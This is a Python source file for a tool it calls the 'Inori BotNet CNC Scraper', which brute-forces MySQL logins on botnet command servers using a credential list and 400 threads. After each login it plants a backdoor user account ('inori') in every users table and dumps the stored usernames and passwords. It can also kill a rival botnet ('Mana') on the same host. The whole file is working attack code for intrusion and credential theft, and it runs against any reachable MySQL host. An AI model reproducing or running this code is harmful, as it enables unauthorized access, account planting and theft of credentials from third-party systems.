from concurrent.futures import ThreadPoolExecutor
from pymysql import connect
from json import load, dump

from .killer import ManaKiller

# -----------------------------------------------

class Colors:
    WHITE:     str = '\033[38;2;255;255;255m'
    PINKRED:   str = '\033[38;2;255;50;75m'
    LIME:      str = '\033[38;2;0;255;152m'
    RED:       str = '\033[38;2;255;0;0m'
    LIGHTRED:  str = '\033[38;2;255;25;50m'
    LIGHTPINK: str = '\033[38;2;255;100;255m'


INORI: str = '\033[38;2;255;100;255mI\033[38;2;255;90;219mn\033[38;2;255;80;183mo\033[38;2;255;70;147mr\033[38;2;255;60;111mi'
MANA:  str = '\033[38;2;100;100;250mM\033[38;2;138;75;251ma\033[38;2;176;50;252mn\033[38;2;214;25;253ma'

BANNER: str = f"""\033[38;2;255;100;255m╦\033[38;2;255;96;240m╔\033[38;2;255;92;225m╗\033[38;2;255;88;210m╔\033[38;2;255;84;195m╔\033[38;2;255;80;180m═\033[38;2;255;76;165m╗\033[38;2;255;72;150m╦\033[38;2;255;68;135m═\033[38;2;255;64;120m╗\033[38;2;255;60;105m╦
\033[38;2;255;100;255m║\033[38;2;255;96;240m║\033[38;2;255;92;225m║\033[38;2;255;88;210m║\033[38;2;255;84;195m║\033[38;2;255;80;180m \033[38;2;255;76;165m║\033[38;2;255;72;150m╠\033[38;2;255;68;135m╦\033[38;2;255;64;120m╝\033[38;2;255;60;105m║
\033[38;2;255;100;255m╩\033[38;2;255;96;239m╝\033[38;2;255;92;223m╚\033[38;2;255;88;207m╝\033[38;2;255;84;191m╚\033[38;2;255;80;175m═\033[38;2;255;76;159m╝\033[38;2;255;72;143m╩\033[38;2;255;68;127m╚\033[38;2;255;64;111m═\033[38;2;255;60;95m╩ BotNet \033[38;2;255;255;255mCNC Scraper"""

SQL_FILTER: tuple = ( 'information_schema', 'performance_schema', 'Z_README_TO_RECOVER', 'mysql')

# -----------------------------------------------


class Bruter:
    CONFIG = load(open('config.json'))
    
    def __init__(self: object, ip_list: list = list) -> None:
        self.combos:  str  = open('lib/creds.txt').readlines()
        self.results: list = []
        self.kill_enabled: bool   = self.CONFIG['kill_enabled']
        self.killer: object = ManaKiller()
        self.ip_list: list = ip_list

    @staticmethod    
    def update_db(entry: dict) -> bool | None: 
        with open('database.json','r+') as database_file:
            file_data: dict = load(database_file)

            if not entry in file_data['results_database']:
                file_data['results_database'].append(entry)
                database_file.seek(0)
                dump(file_data, database_file, indent = 4)
                return True

    def run(self: object) -> None:
        with ThreadPoolExecutor(max_workers=400) as executor:
            for cnc_server in self.ip_list:
                executor.submit(self.injection, cnc_server)
                    
                    
                    
    def injection(self: object, cnc_server: dict) -> None:
        for cred in self.combos:
            username, _, password = cred.strip().partition(':')
                
            try:
                with connect(user = username, password = password, host = cnc_server['ip'], connect_timeout = 5) as conn:
                    database_lists: list = []
                    cnc_server.update({'mysql_login': f'{username}:{password}'})
                    cursor = conn.cursor()
                    cursor.execute('show databases')

                    for db in [db[0] for db in cursor.fetchall() if not db[0] in SQL_FILTER]:
                        cursor.execute(f'use {db};')
                            
                        try:
                            cursor.execute(f"INSERT INTO users VALUES (NULL, 'inori', 'lmaowtf', 0, 0, 0, 0, -1, 1, 30, '');")
                            cursor.execute('SELECT * from users')
                        except:
                            database_lists.append({db : ['Users table not found.']})
                            continue
                            
                        database_creds: list = []

                        for row in cursor.fetchall():
                            if row[1] and row[2] and not f'{row[1]}:{row[2]}' in database_creds:
                                database_creds.append(f'{row[1]}:{row[2]}')
                                                    
                        database_lists.append({db : database_creds})  

                    cnc_server.update({'databases': database_lists})
                    self.results.append(cnc_server)
                    
                    print(f"""{Colors.LIME}• {INORI} {Colors.WHITE}has logged in {Colors.PINKRED}{cnc_server['ip']} {Colors.WHITE}({Colors.LIGHTPINK}{cnc_server['mysql_login']}{Colors.WHITE}) {Colors.WHITE}({Colors.LIGHTPINK}{cnc_server['arch']}{Colors.WHITE})""")
                    print(f'{Colors.LIGHTPINK}• {Colors.WHITE}Dumping databases...')
                    if cnc_server['databases']:
                        for database in cnc_server['databases']:
                            for db, creds in database.items():
                                print(f'{Colors.PINKRED}• {Colors.LIGHTPINK}{db}{Colors.WHITE}: {Colors.PINKRED}{f"{Colors.WHITE},{Colors.PINKRED} ".join(creds)}')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}No database found.')
                        
                        
                    self.killer.addr = cnc_server['ip']
                    if self.killer.verify_mana(cnc_server['arch']):
                        print(f'{Colors.LIME}• {MANA} {Colors.WHITE}source detected!')
                        
                        if self.kill_enabled:
                            if self.killer.execute():
                                print(f'{Colors.LIME}• {Colors.WHITE}Killed {MANA} {Colors.WHITE}source!')
                            else:
                                print(f'{Colors.RED}• {Colors.WHITE}Failed to kill {MANA} {Colors.WHITE}source.')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}No {MANA} {Colors.WHITE}source detected.')
                        
                    if self.update_db(cnc_server):
                        print(f'{Colors.LIME}• {Colors.WHITE}Query added to local results database.')
                    else:
                        print(f'{Colors.RED}• {Colors.WHITE}Query already in local results database.')
                            
                    print()
                    return cnc_server
            except:
                continue
